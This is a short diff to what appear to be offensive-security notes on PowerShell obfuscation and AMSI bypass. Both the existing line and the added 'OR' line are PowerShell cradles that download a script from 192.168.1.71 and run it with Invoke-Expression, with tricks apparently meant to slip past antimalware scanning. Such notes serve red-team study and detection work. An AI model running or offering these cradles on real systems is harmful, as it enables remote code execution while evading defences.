@@ -763,6 +763,10 @@ Here we can view the all process of encoding/decoding in powershell console
 
        powershell Invoke-Expression('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
 
+- OR
+
+      powershell Write-Host "#<NULL>"; Invoke-Expression(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
+
 - For file contents<br />
 
 ![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/DRUo9T.png)
